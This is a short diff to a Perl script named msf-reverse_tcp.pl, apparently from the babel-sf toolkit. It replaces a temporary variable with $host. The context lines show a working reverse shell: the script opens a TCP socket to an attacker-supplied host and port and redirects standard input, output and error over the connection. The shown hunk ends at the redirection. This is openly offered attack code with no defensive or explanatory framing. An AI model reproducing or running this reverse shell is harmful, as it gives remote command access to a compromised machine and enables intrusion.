@@ -27,9 +27,8 @@ elsif ($num_args == 2) {
 	print"Starting msf-reverse_tcp.pl ( https://github.com/attackdebris/babel-sf ) at $date\n";
 	print"Attemping to connect to $host on TCP port $port....\n";
 	use Socket;
-	my $i="$host";
 	socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
-	if(connect(S,sockaddr_in($port,inet_aton($i)))) {
+	if(connect(S,sockaddr_in($port,inet_aton($host)))) {
 	  open(STDIN,">&S");
 	  open(STDOUT,">&S");
 	  open(STDERR,">&S");
